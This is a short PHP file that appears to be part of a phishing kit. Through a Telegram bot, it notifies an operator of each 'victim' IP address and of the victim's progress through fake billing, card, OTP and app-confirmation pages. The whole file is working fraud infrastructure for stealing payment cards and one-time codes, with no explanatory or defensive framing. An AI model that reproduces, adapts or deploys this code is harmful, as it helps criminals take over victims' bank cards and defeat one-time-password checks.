<?php 
require 'telegram.php';

 
 

function note($statu){
	global $api;
	global $chatid;
$msg = "[ Africa NOTIFICATION ]\nVICTIM IP : ".$_SERVER['REMOTE_ADDR']."\nSTATU : $statu";
sendBot("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg));
}





if(isset($_POST['billingview'])){
	note("In billing page");
}

if(isset($_POST['billinging'])){
	note("Entering billing info...");
}
 

if(isset($_POST['cardview'])){
	note("In card page");
}

if(isset($_POST['carding'])){
	note("Entering card info...");
}

if(isset($_POST['otpview'])){
	note("In otp page");
}

if(isset($_POST['otping'])){
	note("Entering otp info...");
}
 

if(isset($_POST['waitingview'])){
	note("Waiting for redirection...");
}

if(isset($_POST['appview'])){
	note("Waiting for app confirmation...");
}

 
 

?>